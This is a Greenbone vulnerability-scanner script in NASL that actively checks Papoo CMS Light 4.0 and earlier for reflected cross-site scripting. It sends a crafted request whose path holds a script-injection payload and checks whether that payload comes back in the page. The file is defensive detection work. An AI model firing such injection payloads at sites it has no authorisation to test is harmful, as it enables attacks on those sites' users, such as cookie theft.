# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:papoo:papoo";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103268");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2011-09-22 13:43:24 +0200 (Thu, 22 Sep 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Papoo CMS Light <= 4.0 Multiple XSS Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_papoo_cms_http_detect.nasl");
  script_mandatory_keys("papoo_cms/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Papoo CMS Light is prone to multiple cross-site scripting (XSS)
  vulnerabilities because it fails to properly sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary HTML
  and script code in the browser of an unsuspecting user in the context of the affected site. This
  may let the attacker steal cookie-based authentication credentials and launch other attacks.");

  script_tag(name:"affected", value:"Papoo CMS Light version 4.0 and prior.");

  script_tag(name:"solution", value:"Update to the latest version.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49587");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/519612");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

vt_strings = get_vt_strings();

url = dir + '/index.php/"></a><script>alert(/' + vt_strings["lowercase"] + "/);</script>";

if (http_vuln_check(port: port, url: url, pattern: "<script>alert\(/" + vt_strings["lowercase"] + "/\);</script>",
                    check_header: TRUE, extra_check: "Papoo")) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
